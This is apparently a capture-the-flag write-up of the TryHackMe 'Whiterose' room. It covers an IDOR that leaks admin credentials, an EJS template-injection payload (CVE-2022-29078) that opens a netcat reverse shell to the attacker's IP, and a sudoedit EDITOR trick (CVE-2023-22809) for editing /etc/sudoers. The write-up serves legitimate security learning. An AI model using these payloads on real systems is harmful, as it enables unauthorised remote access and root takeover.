---
title: Whiterose
date: 2024-12-05
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, ssti, idor]     # TAG names should always be lowercase
comments: false
image: /assets/img/tryhackme/ctf/whiterose/banner.png
---

> Just like many other challenges, [this one](https://tryhackme.com/r/room/whiterose) is also inspired by Mr.Robot (and based on episode "409 Conflict" for anyone who watched the serie).

## Information Gathering

Before we start this challenge, we are given some credentials (`Olivia Cortez:olivi8`) but we do not know when this will be useful.

As always, we start the challenge with a nmap scan :

![Nmap scan screenshot](/assets/img/tryhackme/ctf/whiterose/1.png)

Two services are open on **SSH port** and **HTTP port**.
Hence, we can take a look at the web application hosted on that machine (after writing the dns entry in `/etc/hosts` to translate the domain name).

This being done, we can see how the website looks like :

![Web application default](/assets/img/tryhackme/ctf/whiterose/2.png)

I tried to enumerate the directories but it resulted in nothing.
Then, using **ffuf**, I enumerated the vhosts and found one named *admin* : 

![fuff](/assets/img/tryhackme/ctf/whiterose/fuff.png)

So I decided to take a look at it (after putting the other entry) :

![Admin login](/assets/img/tryhackme/ctf/whiterose/3.png)

We land on this login page that is asking for a name and a password. Obviously, the first thing we can do is trying the credentials we were given at the beginning of the challenge. This proves to be useful because it gives the access to the admin panel on which are displayed the recent payments, bank accounts (with hidden phone numbers), messages and a *Settings* tab we cannot access with our privileges.

![Admin panel](/assets/img/tryhackme/ctf/whiterose/4.png)

When exploring the different tabs, the *Messages* one displays an admin chat :

![Messages tab](/assets/img/tryhackme/ctf/whiterose/5.png)

At first glance, the chat is banalistic but if we take a look at the URL, we observe a *"c"* parameter that is set to *5* and this is instantly catching the eye.
Let's check if there is an [IDOR](https://portswigger.net/web-security/access-control/idor)...

![Messages tab idor](/assets/img/tryhackme/ctf/whiterose/6.png)

We found the password of a privileged admin account!
Now, if we try to connect with **Gayle Bev's account**, these credentials work and we retrieve Tyrell Wellick's phone number to answer the first question of the challenge.

## Initial Access

It took me quite some time to figure out what to do next in order to get an initial access to the target machine, but then I remembered that with the privileged admin account, we also got the access to the *Settings* tab's content that was previously hidden, so I went to check it.

This tab is used for changing the customer's password. When we enter a customer name (no matter what it is) and a new password, it reflects the chosen password on the page so I wondered if I could use this at my advantage (perhaps with a [SSTI](https://portswigger.net/web-security/server-side-template-injection)...).

![Settings tab](/assets/img/tryhackme/ctf/whiterose/7.png)

I tried a few basic payloads but nothing seemed to be working so I intercepted the POST request using Burp Suite.
So far, this is what a classic request looks like :

![Burp1](/assets/img/tryhackme/ctf/whiterose/8.png)

If we omit to enter a customer name or a password, it alerts *'Please enter a valid name'* or asks for a password. However, if we erase the password field then it creates an *Error* response and we can see that this application uses **Embedded JavaScript (.ejs)** and that it is executed server-side.

![Burp2](/assets/img/tryhackme/ctf/whiterose/9.png)

After searching for some time for an exploit on ejs, I found a [website](https://www.seebug.org/vuldb/ssvid-99549) with a PoC for the vulnerability **CVE-2022-29078** and adapted it to my case.

I entered the payload in the Burp Suite request, started my netcat listener on the correct port. Consequently, I managed to open a shell as the **web** user and find the flag named `user.txt` in the parent directory.

```
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc <MY_IP> <MY_PORT> -e bash');s
```

![Burp3](/assets/img/tryhackme/ctf/whiterose/10.png)
![netcat1](/assets/img/tryhackme/ctf/whiterose/11.png)

> I [upgraded my shell](https://0xffsec.com/handbook/shells/full-tty/) for further convenience in the next steps.

## Privilege Escalation

The first thing that I do after I gained the shell ready is to type `sudo -l` in order to see if the **web** user has any particular privileges for a special command, and there is one :

![sudol](/assets/img/tryhackme/ctf/whiterose/12.png)

We can execute the **sudoedit** command with root privileges, without any password on the website file.

After searching a little, I found that there is a vulnerability for this command (**CVE-2023-22809**) that we can exploit to escalate our privileges to root. This vulnerability allows us to modify files we would not be able to modify without root privileges through the **sudoedit** command.

To exploit it, we first need to set a new environment variable called *EDITOR* (that sudoedit will try to find) so that we open `/etc/sudoers` using **nano**.

```shell
export EDITOR="nano -- /etc/sudoers"
```

![env](/assets/img/tryhackme/ctf/whiterose/13.png)

Then if we type the command we have root privileges on...
```shell
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
...it opens the `/etc/sudoers` file and we can modify it to give the **web** user the rights to use every commands with root privileges.

![etcsudoers](/assets/img/tryhackme/ctf/whiterose/14.png)

Once we save the files, we can now elevate our privileges and discover the last flag to finish the challenge!

![rootflag](/assets/img/tryhackme/ctf/whiterose/15.png)